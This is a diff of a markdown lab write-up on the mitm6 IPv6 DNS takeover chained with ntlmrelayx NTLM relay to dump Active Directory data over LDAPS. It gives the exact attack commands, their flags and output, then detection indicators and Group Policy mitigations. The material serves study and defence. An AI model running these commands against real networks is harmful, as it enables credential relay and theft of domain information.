@@ -8,20 +8,23 @@
 
 ## Table of Contents
 
-1. [Overview](#overview)
-2. [Attack Theory](#attack-theory)
-3. [Lab Setup](#lab-setup)
-4. [Attack Steps](#attack-steps)
-   - [Step 1 — Start mitm6](#step-1--start-mitm6)
-   - [Step 2 — Launch NTLM Relay](#step-2--launch-ntlm-relay)
-   - [Step 3 — Trigger Authentication from Victim](#step-3--trigger-authentication-from-victim)
-   - [Step 4 — Relay Succeeds & Loot Retrieved](#step-4--relay-succeeds--loot-retrieved)
-   - [Step 5 — Explore Loot Folder](#step-5--explore-loot-folder)
-5. [Mitigations](#mitigations)
-6. [Key Takeaways](#key-takeaways)
-7. [References](#references)
+- [Introduction](#introduction)
+- [Attack Flow](#attack-flow)
+- [Why This Attack Works](#why-this-attack-works)
+- [Lab Setup](#lab-setup)
+- [Tools Used](#tools-used)
+- [Prerequisites](#prerequisites)
+- [Step 1 — Starting mitm6](#step-1--starting-mitm6)
+- [Step 2 — Starting NTLM Relay](#step-2--starting-ntlm-relay)
+- [Step 3 — Triggering Authentication from Victim](#step-3--triggering-authentication-from-victim)
+- [Step 4 — Relaying Authentication and Retrieving Loot](#step-4--relaying-authentication-and-retrieving-loot)
+- [Step 5 — Exploring the Loot Folder](#step-5--exploring-the-loot-folder)
+- [How Defenders Can Catch This](#how-defenders-can-catch-this)
+- [How to Prevent It](#how-to-prevent-it)
+- [References](#references)
+- [Lessons Learned](#lessons-learned)
 
-## Overview
+## Introduction
 
 `mitm6` is a tool that exploits a fundamental design decision in Windows networking: **IPv6 is preferred over IPv4 by default on modern Windows systems**.
 
@@ -35,54 +38,99 @@ When combined with Impacket’s `ntlmrelayx`, this technique becomes a powerful 
 - Relay to SMB services to access file shares or execute commands
 - Ultimately escalate privileges and potentially achieve **Domain Admin access without cracking passwords**
 
-
-## Attack Theory
-
-Why IPv6?
-
-Windows machines periodically broadcast DHCPv6 Solicit messages looking for an IPv6 gateway and DNS server. By default, these go unanswered on most enterprise networks. mitm6 responds to these broadcasts, assigning the attacker's link-local IPv6 address as the DNS server.
+## Attack Flow
 
 ```
-Victim     → DNS: "Where is wpad.corp.local?"
-mitm6      → DNS: "It's at attacker's IP"
-Victim     → HTTP: GET http://attacker/wpad.dat
-ntlmrelayx → "Authenticate with NTLM!"
-Victim     → [Sends NTLM handshake]
-ntlmrelayx → [Relays to DC's LDAP]
-DC         → [Authenticated!]
+Attacker Starts mitm6
+                ↓
+Victim Sends DHCPv6 Solicit Request
+                ↓
+mitm6 Responds with Fake DHCPv6 Configuration
+                ↓
+Victim Uses Attacker Machine as IPv6 DNS Server
+                ↓
+Victim Requests WPAD Configuration
+                ↓
+mitm6 Redirects WPAD Request to ntlmrelayx
+                ↓
+Victim Sends NTLM Authentication
+                ↓
+ntlmrelayx Relays Authentication to Domain Controller
+                ↓
+LDAP/LDAPS Authentication Succeeds
+                ↓
+Active Directory Information is Dumped
+                ↓
+Loot Files are Saved
+                ↓
+Attacker Gains Access to Domain Information
 ```
+## Why This Attack Works
+
+This attack works because Windows prefers IPv6 over IPv4 when both are available. In many Active Directory environments, IPv6 is enabled by default, but it is not properly configured or monitored.
+
+When a Windows machine looks for a DHCPv6 server, it accepts responses from any available DHCPv6 server on the network. An attacker can use mitm6 to send fake DHCPv6 responses and make the victim machine use the attacker’s system as its DNS server.
+
+After controlling DNS responses, the attacker can redirect WPAD requests to their own machine. Windows may then automatically send NTLM authentication when trying to download the WPAD configuration file.
+
+The attacker uses ntlmrelayx to forward this authentication to the Domain Controller. If the server accepts the authentication, the attacker can collect Active Directory information without knowing the user's password.
+
+This attack is possible because of the following conditions:
+
+- IPv6 is enabled on Windows machines.
+- No trusted DHCPv6 or DNSv6 server is configured.
+- WPAD is enabled in the environment.
+- NTLM authentication is allowed.
+- LDAP signing is not enforced.
+- The attacker is connected to the same network.
 
 ## Lab Setup
 
-```
 | Machine   | Role                | OS                  | IP Address      |
 |-----------|---------------------|---------------------|-----------------|
-| Attacker  | Attacker            | Kali Linux          | 192.168.5.128   |
-| Server    | Domain Controller   | Windows Server 2019 | 192.168.5.134   |
-| Victim    | Victim Workstation  | Windows 10          | 192.168.5.135   |
-```
+| Attacker  | Attacker            | Kali Linux          | `192.168.5.128` |
+| Server    | Domain Controller   | Windows Server 2019 | `192.168.5.134` |
+| Victim    | Victim Workstation  | Windows 10          | `192.168.5.135` |
+
+## Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| `mitm6` | Creates a fake DHCPv6 server and redirects DNS requests to the attacker machine |
+| `ntlmrelayx.py` | Relays captured NTLM authentication to the Domain Controller |
+| `secretsdump.py` | Extracts account information and hashes from Windows systems |
+
+## Prerequisites
+
+| What | Why |
+|------|-----|
+| Kali Linux machine | Runs mitm6 and Impacket tools |
+| Active Directory lab | Provides the Domain Controller and Windows victim machine |
+| Windows victim machine | Generates DHCPv6 and NTLM authentication requests |
+| Domain Controller | Target system for NTLM relay |
+| IPv6 enabled on Windows | Required for the attack to work |
+| NTLM authentication enabled | Allows authentication relay |
+| WPAD enabled | Allows the attacker to trigger authentication requests |
 
 **Domain Name:** `readteambd.local`
 
-# Attack Steps
-
-## Step 1 — Start mitm6
+## Step 1 — Starting mitm6
 
 I started mitm6 in a separate terminal and targeted the internal domain on the LAN interface.
 
 ```bash
 sudo mitm6 -d readteambd.local -i eth0
 ```
+**Flag Breakdown**
 
-```
 | Flag |           Meaning                 |
 |------|-----------------------------------|
-| sudo | Run with root privileges          |
-| mitm6| Starts IPv6 spoofing (DHCPv6/DNS) |
-| -d   | Target domain                     |
-| -i   | Network interface                 |
-| eth0 | Active LAN interface              |
-```
+| `sudo` | Run with root privileges          |
+| `mitm6`| Starts IPv6 spoofing (DHCPv6/DNS) |
+| `-d`   | Target domain                     |
+| `-i`   | Network interface                 |
+| `eth0` | Active LAN interface              |
+
 
 ### What Happens
 
@@ -92,7 +140,7 @@ sudo mitm6 -d readteambd.local -i eth0
 - DNS queries get redirected to my machine
 - WPAD and internal domain lookups are also redirected to me 
 
-**mitm6 output:**
+**Output:**
 
 ```
 Starting mitm6 using the following configuration:
@@ -110,25 +158,24 @@ Sent spoofed reply for wpad.readteambd.local. to fe80::502e:c6be:1fe9:c8bf
   <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step1.png" width="600">
 </p>
 
-## Step 2 — Launch NTLM Relay
+## Step 2 — Starting NTLM Relay
 
 On another terminal, I started ntlmrelayx to catch and relay authentication requests.
 
 ```bash
 ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootme
 ```
+**Flag Breakdown**
 
-```
 |             Flag              |                      Meaning                |
 |-------------------------------|---------------------------------------------|
-| ntlmrelayx.py                 | Tool used for NTLM relay attacks            |
-| -6                            | Enables IPv6 support                        |
-| -t ldaps://192.168.5.130      | Target Domain Controller using LDAPS        |
-| -wh fakewpad.readteambd.local | Fake WPAD hostname to trigger authentication|
-|-l lootme                      | Saves captured data to local folder         |
-```
+| `ntlmrelayx.py`                 | Tool used for NTLM relay attacks            |
+| `-6`                            | Enables IPv6 support                        |
+| `-t ldaps://192.168.5.130`      | Target Domain Controller using LDAPS        |
+| `-wh fakewpad.readteambd.local` | Fake WPAD hostname to trigger authentication|
+| `-l lootme`                     | Saves captured data to local folder         |
 
-**ntlmrelayx startup output:**
+**Output:**
 
 ```
 [*] Protocol Client SMB loaded..
@@ -153,7 +200,7 @@ ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootm
   <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step2.png" width="600">
 </p>
 
-## Step 3 — Trigger Authentication from Victim
+## Step 3 — Triggering Authentication from Victim
 
 On the Windows 10 victim machine, I simply restarted the system.
 After the reboot, Windows automatically started the authentication process:
@@ -168,7 +215,7 @@ After the reboot, Windows automatically started the authentication process:
 
 > *"No user interaction is required once the victim logs into Windows. The attack is completely silent."*
 
-## Step 4 — Relay Succeeds & Loot Retrieved
+## Step 4 — Relaying Authentication and Retrieving Loot
 
 When the victim machine sends an authentication request, `ntlmrelayx` receives it and relays it to the Domain Controller’s LDAP service.
 
@@ -188,9 +235,9 @@ After a successful relay, domain information is saved in the `lootme` directory.
   <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step4.png" width="600">
 </p>
 
-## Step 5 — Explore Loot Folder
+## Step 5 — Exploring the Loot Folder
 
-I checked the `lootme` directory created by ntlmrelayx. It contains LDAP dump files with domain information.
+I checked the `lootme` directory created by `ntlmrelayx`. It contains the LDAP enumeration results collected from the Domain Controller.
 
 ```
 lootme/
@@ -203,8 +250,9 @@ lootme/
 ├── domain_users_by_group.html
 └── domain_users.grep
 ```
+The generated files contain information about domain users, computers, groups, policies, and trust relationships.
 
-Next, I opened **`domain_users_by_group.html`** in a web browser to review the domain users and their group memberships.
+Next, I opened **`domain_users_by_group.html`** in a web browser to analyze domain users and their group memberships.
 
 <p align="center">
   <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step5-1.png" width="600">
@@ -216,34 +264,63 @@ Next, I opened **`domain_users_by_group.html`** in a web browser to review the d
   <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step5-3.png" width="600">
 </p>
 
-## Mitigations
+## How Defenders Can Catch This
+
+| Indicator | What to look for |
+|-----------|------------------|
+| Unknown DHCPv6 server on the network | Monitor DHCPv6 traffic for unauthorized servers |
+| Unexpected IPv6 DNS server configuration | Check systems for unusual DNS settings |
+| WPAD requests going to unknown machines | Review proxy and DNS logs |
+| NTLM authentication from unexpected sources | Monitor Windows authentication logs |
+| LDAP authentication from workstations | Check Domain Controller logs for unusual LDAP activity |
+| New computer accounts created in Active Directory | Monitor account creation events |
+| Suspicious DNS responses | Review DNS logs for unusual domain resolutions |
+| Rogue IPv6 traffic on the network | Monitor network traffic for unknown IPv6 devices |
+
+
+## How to Prevent It
+
+**Disable IPv6 if it is not required**  
+If IPv6 is not being used in the environment, disable it to reduce the attack surface:
 
 ```
-1. Disable IPv6 if Not in Use
-2. Block DHCPv6 Traffic at the Network Level
-3. Enforce LDAP Signing & Channel Binding
-4. Enable SMB Signing
-5. Disable WPAD via Group Policy
-6. Restrict NTLM Authentication
+Group Policy → Computer Configuration → Administrative Templates → Network → IPv6 Configuration
 ```
 
-## Key Takeaways
+**Disable WPAD**
+WPAD can be abused to redirect authentication requests to an attacker-controlled system. Disable WPAD through Group Policy:
 
-- IPv6 is enabled by default on all modern Windows systems — even in environments that never intentionally configured it, making this attack surface invisible to most defenders.
+```
+Group Policy → Computer Configuration → Administrative Templates → Windows Components → Internet Explorer → Disable changing proxy settings
+```
 
-- mitm6 requires no credentials to launch. An unauthenticated attacker on the same network segment can begin poisoning DNS responses immediately.
+**Block unauthorized DHCPv6 traffic**
+Only allow trusted DHCPv6 servers on the network. Block unauthorized DHCPv6 responses from unknown devices:
 
-- The attack chain is silent. Windows machines will automatically reach out to the rogue DHCPv6 server without any user interaction — the victim doesn't click anything.
+```
+Network Firewall → Block Unauthorized DHCPv6 Traffic
+```
 
-- NTLM relay is the real payload. mitm6 alone is just the entry point — the captured credentials relayed via ntlmrelayx are what give the attacker persistence, lateral movement, and potentially Domain Admin.
+**Enable LDAP Signing and Channel Binding**
+LDAP signing helps prevent attackers from relaying NTLM authentication to the Domain Controller:
 
-- A single misconfiguration enables full domain compromise. If LDAP signing is not enforced and IPv6 is not blocked, an attacker can go from zero to Domain Admin in minutes.
+```
+Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
+```
 
-- Defense-in-depth is required. No single fix stops this attack entirely — you need to disable DHCPv6, enforce LDAP signing, enable SMB signing, and disable WPAD together.
+**Enable SMB Signing**
+SMB signing prevents attackers from relaying authentication requests to SMB services:
 
-- This attack is well-known and still widely unpatched. First published by Fox-IT in 2018, it remains highly effective in real-world red team engagements today because IPv6 hardening is still overlooked in most AD environments.
+```
+Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
+```
 
-- Detection is possible but often missed. Event IDs 4624 and 4742, unexpected machine account creation, and rogue DHCPv6 traffic are all detectable — but only if you're actively monitoring for them.
+**Restrict NTLM Authentication**
+Reduce the use of NTLM authentication and use Kerberos authentication whenever possible:
+
+```
+Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
+```
 
 ## References
 
@@ -259,3 +336,13 @@ Next, I opened **`domain_users_by_group.html`** in a web browser to review the d
 | 8 | [Active Directory Security — adsecurity.org](https://adsecurity.org/) |
 | 9 | [MITRE ATT&CK — T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) |
 
+## Lessons Learned
+
+- IPv6 security should not be ignored, even if the network mainly uses IPv4.
+- Windows systems automatically prefer IPv6, which can create security risks if it is not properly configured.
+- mitm6 can abuse unsecured DHCPv6 and DNS configurations to redirect network traffic.
+- NTLM relay attacks do not require password cracking; they reuse valid authentication requests.
+- WPAD can become a security risk when it allows automatic authentication to untrusted systems.
+- LDAP signing and channel binding are important protections against NTLM relay attacks.
+- Proper Active Directory hardening can prevent attackers from gaining sensitive domain information.
+- Regular monitoring of DHCPv6, DNS, and authentication logs helps detect suspicious activity.
